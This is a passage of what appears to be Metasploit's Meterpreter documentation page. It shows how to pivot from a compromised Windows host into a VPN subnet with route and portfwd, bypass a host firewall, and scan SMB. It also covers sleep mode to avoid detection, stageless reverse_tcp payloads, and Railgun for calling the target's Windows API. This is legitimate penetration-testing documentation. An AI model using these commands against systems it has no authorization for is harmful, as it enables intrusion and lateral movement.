style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.201:49182) at 2016-03-04 20:35:31 -0600\n\nmeterpreter &gt; ipconfig\n...\nInterface 10\n============\nName         : Intel(R) PRO/1000 MT Network Connection\nHardware MAC : 00:0c:29:86:4b:0d\nMTU          : 1472\nIPv4 Address : 192.168.1.201\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : 2602:30a:2c51:e660::20\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\nIPv6 Address : 2602:30a:2c51:e660:44a:576e:3d2c:d765\nIPv6 Netmask : ffff:ffff:ffff:ffff::\nIPv6 Address : 2602:30a:2c51:e660:94be:567f:4fe7:5da7\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\nIPv6 Address : fe80::44a:576e:3d2c:d765\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\n...\n\nInterface 26\n============\nName         : VPN\nHardware MAC : 00:00:00:00:00:00\nMTU          : 1400\nIPv4 Address : 192.100.0.100\nIPv4 Netmask : 255.255.255.255\n\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The example above shows that we have a Meterpreter connection to 192.168.1.201. Let's call this box A, and it  is connected to the 192.100.0.0/24 VPN network. As an attacker, we aren't connected to this network directly, but we can explore that network through box A.</p>\n<p>At the msf prompt, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; route add 192.100.0.0 255.255.255.0 1\n[*] Route added</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The  <code class=\"language-text\">1</code> at the end of the route indicates the session ID, the payload that is used as a gateway to talk to other machines.</p>\n<p>So right now, we have a connection established to the VPN, and we should be able to connect to another machine from that network:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(smb_version) &gt; run\n\n[*] 192.100.0.101:445     - 192.100.0.101:445 is running Windows 2003 SP2 (build:3790) (name:SINN3R-QIXN9TA2) (domain:WORKGROUP)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_version) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Another neat trick using route is that you can also bypass the compromised host's firewall this way. For example, if the host has HTTP open, but SMB is blocked by the firewall, you can try to compromise it via HTTP first. You'll need to use the route command to talk to SMB and then try to exploit SMB.</p>\n<p><strong><em>Routing through Meterpreter</em></strong></p>\n<p>The route command in Meterpreter allows you change the routing table that is on the target machine. The way it needs to be configured is similar to the route command in msfconsole.</p>\n<p><strong><em>Routing through the portfwd command</em></strong></p>\n<p>The portfwd command allows you to talk to a remote service like it's local. For example, if you are able to compromise a host via SMB, but are not able to connect to the remote desktop service, then you can do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; portfwd add –l 3389 –p 3389 –r [Target Host]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And that should allow you to connect to remote desktop this way on the attacker's box:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">rdesktop 127.0.0.1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>Meterpreter Paranoid Mode</strong></p>\n<p>The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to it, hence the name \"paranoid mode\".</p>\n<p>To learn more about this feature, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click here</a>.</p>\n<p><strong>Meterpreter Reliable Network Communication</strong></p>\n<p>Exiting Metasploit using <code class=\"language-text\">exit -y</code> no longer terminates the payload session like it used to. Instead, it will continue to run behind the scenes, attempting to connect back to Metasploit when an appropriate handler is available. If you wish to exit the session, make sure to <code class=\"language-text\">sessions -K</code> first.</p>\n<p>To learn more about this feature, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click here</a>.</p>\n<p><strong>Meterpreter Sleep Control</strong></p>\n<p>The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to avoid suspicious active communication. It also provides better efficiency.</p>\n<p>It is very simple to use. At the Meterpreter prompt, simply do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sleep 20</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the payload\nhandler remains active (such as being a background job).</p>\n<p>To learn more about this feature, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click here</a>.</p>\n<p><strong>Meterpreter Stageless Mode</strong></p>\n<p>A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a normal one would actually cost too much time and bandwidth in a penetration test. To learn more about this, <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click on this</a> to read more.</p>\n<p>To use the stageless payload, use <code class=\"language-text\">windows/meterpreter_reverse_tcp</code> instead.</p>\n<p><strong>Meterpreter Timeout Control</strong></p>\n<p>The timeout control basically defines the life span of Meterpreter. To configure it, use the\n<code class=\"language-text\">set_timeouts</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; set_timeouts\nUsage: set_timeouts [options]\n\nSet the current timeout options.\nAny or all of these can be set at once.\n\nOPTIONS:\n\n    -c &lt;opt&gt;  Comms timeout (seconds)\n    -h        Help menu\n    -t &lt;opt&gt;  Retry total time (seconds)\n    -w &lt;opt&gt;  Retry wait time (seconds)\n    -x &lt;opt&gt;  Expiration timout (seconds)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To see the current timeout configuration, you can use the <code class=\"language-text\">get_timeouts</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; get_timeouts\nSession Expiry  : @ 2016-03-11 21:15:58\nComm Timeout    : 300 seconds\nRetry Total Time: 3600 seconds\nRetry Wait Time : 10 seconds</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To learn more about timeout control, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">go here</a>.</p>\n<p><strong>Meterpreter Transport Control</strong></p>\n<p>Transport Control allows you manage transports on the fly while the payload session is still running. Meterpreter can automatically cycle through the transports when communication fails, or you can do it manually.</p>\n<p>To learn more about this, please read this <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">documentation</a>.</p>\n<h2 id=\"using-the-post-exploitation-api-in-irb\" style=\"position:relative;\"><a href=\"#using-the-post-exploitation-api-in-irb\" aria-label=\"using the post exploitation api in irb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using the Post Exploitation API in IRB</h2>\n<p>To enter IRB, do the following at the Meterpreter prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; irb\n[*] Starting IRB shell\n[*] The &#39;client&#39; variable holds the meterpreter client\n\n&gt;&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>The client object</strong></p>\n<p>The client object in Meterpreter's IRB allows you control or retrieve information about the host. For example, this demonstrates how to obtain the current privilege we're running the payload as:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token operator\">></span><span class=\"token operator\">></span> client<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>getuid</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To explore the client object, there are a few tricks. For example, you can use the #inspect method to inspect it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.inspect</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You can use the #methods method to see what methods you can use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.methods</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To find the source of the method, you can use the #source_location method. For example, say I want to find the source code for the #getuid method:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.method(:getuid).source_location\n=&gt; [&quot;/Users/user/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb&quot;, 32]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The first element of the array is the location of the file. The second element is the line number of the method.</p>\n<p><strong>Using Railgun</strong></p>\n<p>Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a MessageBox on the target machine, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.railgun.user32.MessageBoxA(0, &quot;hello, world&quot;, &quot;hello&quot;, &quot;MB_OK&quot;)\n=&gt; {&quot;GetLastError&quot;=&gt;0, &quot;ErrorMessage&quot;=&gt;&quot;The operation completed successfully.&quot;, &quot;return&quot;=&gt;1}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>To learn more about using Railgun, please read this <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">wiki</a>.</p>"}}},"pageContext":{"id":"9d4548f9-91fc-5741-a77f-263816a6483d"}}}